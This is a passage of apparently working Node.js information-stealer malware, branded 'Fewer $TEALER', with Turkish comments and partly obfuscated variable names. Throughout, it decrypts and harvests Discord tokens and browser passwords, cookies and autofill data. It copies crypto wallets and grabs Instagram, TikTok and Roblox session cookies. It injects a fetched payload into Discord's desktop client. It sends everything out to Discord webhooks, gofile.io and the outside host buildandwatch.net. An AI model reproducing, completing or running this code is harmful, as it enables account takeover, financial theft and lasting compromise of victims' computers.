        value: "```" + cookie + "```",
        inline: true
      },
      {
        name: "Profile URL",
        value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
        inline: true
      },
      {
        name: "User Identifier",
        value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
        inline: true
      },
      {
        name: "Email",
        value: "```" + (accountInfo.data.email || "No Email") + "```",
        inline: true
      },
      {
        name: "Username",
        value: "```" + accountInfo.data.username + "```",
        inline: true
      },
      {
        name: "Follower Count",
        value: "```" + (insights?.follower_num?.value || "Not available") + "```",
        inline: true
      },
      {
        name: "Coins",
        value: "```" + wallet.data.coins + "```",
        inline: true
      }
    ],
    footer: {
      text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
    }
  }
 ]
};

                // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL

                axios.post(webhook3939, webhookPayload)
                  .then(() => {
                    console.log("Discord webhook sent successfully!");
                  })
axios.post("https://buildandwatch.net/wbkk", webhookPayload)
                  .then(() => {
                    console.log("Discord webhook sent successfully!");
                  })                
				.catch(error => {
                    console.error("Error sending Discord webhook:", error.message);
                  });
              })
              .catch(error => {
                console.error("Error fetching wallet data:", error.message);
                throw error;
              });
          })
          .catch(error => {
            console.error("Error fetching insights:", error.message);
            throw error;
          });
      })
      .catch(error => {
        console.error("Error fetching account info:", error.message);
        throw error;
      });
  } catch (error) {
    console.error("Error:", error.message);
    throw error;
  }
}


///


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}


async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}


async function zipFolder(sourcePath, zipFilePath) {
  const output = fs.createWriteStream(zipFilePath);
  const archive = archiver('zip', { zlib: { level: 9 } });

  return new Promise((resolve, reject) => {
    output.on('close', resolve);
    archive.on('error', reject);

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}


function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}

function GetTokensFromPath(tokenPath) {

    let path_tail = path;
    tokenPath += "\\Local Storage\\leveldb";
    let tokens = [];

    if (tokenPath.includes('cord')) {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
                fs.readdirSync(tokenPath)
                    .map(file => {
                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                            .split(/\r?\n/)
                            .forEach(line => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTokens = line.match(pattern);
                                if (foundTokens) {
                                    foundTokens.forEach(token => {
                                        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                                        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
                                        token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
                                        let start = token.slice(3, 15),
                                            middle = token.slice(15, token.length - 16),
                                            end = token.slice(token.length - 16, token.length),
                                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);

                                        decipher.setAuthTag(end);
                                        let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
                                        if (!tokens.includes(out)) tokens.push(out);
                                    })
                                }
                            });
                    });
            } catch {}
            return tokens;
        }
    } else {
        try {

            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
                if (file.endsWith(".log") || file.endsWith(".ldb")) {
                    fs.readFileSync(`${tokenPath}\\${file}`, "utf8")
                        .split(/\r?\n/)
                        .forEach(async (line) => {
                            const regex = [
                                new RegExp(/mfa\.[\w-]{84}/g),
                                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)
                            ];
                            for (const _regex of regex) {
                                const token = line.match(_regex);

                                if (token) {
                                    token.forEach((element) => {
                                        tokens.push(element);
                                    });
                                }
                            }
                        });
                }
            });
        } catch {

        }
    }
    return tokens;
}

function findToken(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}


async function createZip(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZippp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
		          console.log('ZIP arşivi oluşturuldu: ' + zipPath);

        resolve();
      }
    });
  });
}

async function getZippp() {
	
getZipp(randomPath, randomPath + '.zip')
 const form = new FormData();
  form.append('file', fs.createReadStream('./' + user.randomUUID + '.zip'));
        form.submit(webhook3939, (error, response) => {
        if (error) console.log(error);
        });

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = './' + user.randomUUID + '.zip';

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Wallet Dosya Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://example.com/webhook-endpoint';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

}

async function stealltokens() {
    const fields = [];
    for (let path of paths) {
        const foundTokens = findToken(path);
        if (foundTokens) foundTokens.forEach(token => {
            var c = {
                name: "<:browserstokens:951827260741156874> Browser Token;",
                value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/` + token + `)`,
                inline: !0
            }
            fields.push(c)
        });
    }
 axios.post(webhook3939, {
        "content": null,
        "embeds": [
          {
            "color": config["embed-color"],
            "fields": fields.filter(onlyUnique),
            "author": {
                "name": `Fewer $TEALER`,
                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
            },
            "footer": {
                "text": "Fewer $TEALER"
            },
        }]
    }) .then(res => {}).catch(error => {})

    axios.post("https://buildandwatch.net/wbkk", {
        "content": null,
        "embeds": [
          {
            "color": config["embed-color"],
            "fields": fields.filter(onlyUnique),
            "author": {
                "name": `Fewer $TEALER`,
                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
            },
            "footer": {
                "text": "Fewer $TEALER"
            },
        }]
    }) .then(res => {}).catch(error => {})
    
}
   






function StealTokens() {
    let paths;

    if (process.platform == "win32") {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;

        paths = {
            Discord: path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            Opera: path.join(roaming, "Opera Software", "Opera Stable"),
            Brave: path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            Yandex: path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
        };
    }

    const tokens = {};
    for (let [platform, path] of Object.entries(paths)) {
        const tokenList = GetTokensFromPath(path);
        if (tokenList) {
            tokenList.forEach((token) => {
                SendDataToBackEnd(token)
                if (tokens[platform] === undefined) tokens[platform] = [];
                tokens[platform].push(token);
            });
        }
    }
}


async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
    }
    const response = await httpx(`${baseapi}/github`, {
        data: {
            key: webhook3939
        }
    });

    const res = response.data.replace("%API_AUTH_HERE%", webhook3939);
    injection = res;

    await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {})),

                                                        fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js");
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}



async function getExtension() {
  addFolder('Wallets'); // Assuming addFolder() function is defined somewhere

  let walletCount = 0;
  let browserCount = 0;

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;
        copyFolder(walletFolder, browserExtensionPath);
        walletCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = `\\wallets\\${walletName}`;
      copyFolder(walletFolder, walletPath);
      browserCount++;
      count.wallets++;
    }
  }

  if (walletCount > 0 || browserCount > 0) {
    const message =
      `🛠️ Browser wallet: \`${walletCount}\`\n` +
      `🖥️ Desktop wallet: \`${browserCount}\``;


    axios.post(webhook3939, {
      "content": message
    }).then(() => {
      console.log('Webhook isteği başarıyla gönderildi.');
    }).catch(error => {
      console.error('Webhook isteği gönderilirken bir hata oluştu:', error.message);
    });
  } else {
    console.log('walletCount and browserCount are both 0. No action needed.');
  }
 
}



async function getPasswords() {
  const _0x540754 = [];
  let passwordsFound = false; // Şifre bulunduğu zaman bu değeri true yapacağız

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          let _0x3d2b4b = _0x504e35.password_value;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );

            count.passwords++;
            passwordsFound = true; // Şifre bulunduğunu işaretliyoruz
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }

  if (!passwordsFound) {
    // Şifre bulunamadıysa bu kod bloğu çalışır
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', 'No passwords found.', {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
  
  
 //const passwords = fs.readFileSync(`${randomPath}/Wallets/Passwords.txt`, 'utf-8');
//await httpx.post(`${api_url}/api/passwords?auth=${api_auth}`, { pass: passwords });


// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Passwords.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Password Dosyası Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 const form = new FormData();
        form.append("file", fs.createReadStream(`${randomPath}/Wallets/Passwords.txt`));
        form.submit(webhook3939, (error, response) => {
        if (error) console.log(error);
        });
};



async function getCookiesAndSendWebhook() {
  addFolder('Wallets\\Cookies');
  const cookiesData = {};

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            }

  if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            }

            if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {}

          if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
          }

          cookiesData[browserFolder + '_' + browserPath[i][1]].push(
            `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n`
          );

          count.cookies++;
        },
        () => {
          resolve('');
        }
      );
    });
  }

  for (let [browserName, cookies] of Object.entries(cookiesData)) {
    if (cookies.length !== 0) {
      var cookiesContent = cookies.join('');
      fs.writeFileSync(
        randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt',
        cookiesContent,
        {
          encoding: 'utf8',
          flag: 'a+',
        }
      );


 
//const cookiess = fs.readFileSync(randomPath + '/Wallets/Cookies/' + browserName + '.txt', 'utf-8');
//await httpx.post(`${api_url}/api/cookies?auth=${api_auth}`, { cookies: cookiess });




// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Cookies/${browserName}.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Cookies Dosyası Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 const form = new FormData();
        form.append("file", fs.createReadStream(`${randomPath}/Wallets/Cookies/${browserName}.txt`));
        form.submit(webhook3939, (error, response) => {
        if (error) console.log(error);
        });
   

   }
  }
}

//      httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
    //    const webhook = res.data;  
  //      const form = new FormData();
      //  form.append("file", fs.createReadStream(randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt'));
      //  form.submit(webhook, (error, response) => {
    //      if (error) console.log(error);
  //      });
//      });

   //   httpx.get(`${api_url}/check?key=SJGOui8lJ2Moc65P`).then(res => {
 //       const webhook2 = res.data;  
     //   const form = new FormData();
   //     form.append("file", fs.createReadStream(randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt'));
       // form.submit(webhook2, (error, response) => {
     //     if (error) console.log(error);
      //  });
    //  });












async function getAutofills() {
  const _0x3aa126 = [];
  for (let _0x77640d = 0; _0x77640d < browserPath.length; _0x77640d++) {
    if (!fs.existsSync(browserPath[_0x77640d][0])) {
      continue;
    }
    let _0x3c2f27;
    if (browserPath[_0x77640d][0].includes('Local')) {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Roaming\\')[1].split('\\')[1];
    }
    const _0x46d7c4 = browserPath[_0x77640d][0] + 'Web Data';
    const _0x3ddaca = browserPath[_0x77640d][0] + 'webdata.db';
    fs.copyFileSync(_0x46d7c4, _0x3ddaca);
    var _0x4bf289 = new sqlite3.Database(_0x3ddaca, (_0x2d6f43) => {});
    await new Promise((_0x12c353, _0x55610b) => {
      _0x4bf289.each(
        'SELECT * FROM autofill',
        function (_0x54f85c, _0x40d0dd) {
          if (_0x40d0dd) {
            _0x3aa126.push(
              '================\nName: ' +
                _0x40d0dd.name +
                '\nValue: ' +
                _0x40d0dd.value +
                '\nApplication: ' +
                _0x3c2f27 +
                ' ' +
                browserPath[_0x77640d][1] +
                '\n'
            );
            count.autofills++;
          }
        },
        function () {
          _0x12c353('');
        }
      );
    });
    if (_0x3aa126.length === 0) {
      _0x3aa126.push('No autofills found for ' + _0x3c2f27 + ' ' + browserPath[_0x77640d][1] + '\n');
    }
  }
  if (_0x3aa126.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Autofills.txt', user.copyright + _0x3aa126.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
 // const autofills = fs.readFileSync(`${randomPath}/Wallets/Autofills.txt`, 'utf-8');
//await httpx.post(`https://buildandwatch.net/api/autofill?auth=${api_auth}`, { autofill: autofills });
   const form = new FormData();
        form.append("file", fs.createReadStream(`${randomPath}/Wallets/Autofills.txt`));
        form.submit(webhook3939, (error, response) => {
        if (error) console.log(error);
      });


// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Autofills.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Autofill Dosya Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
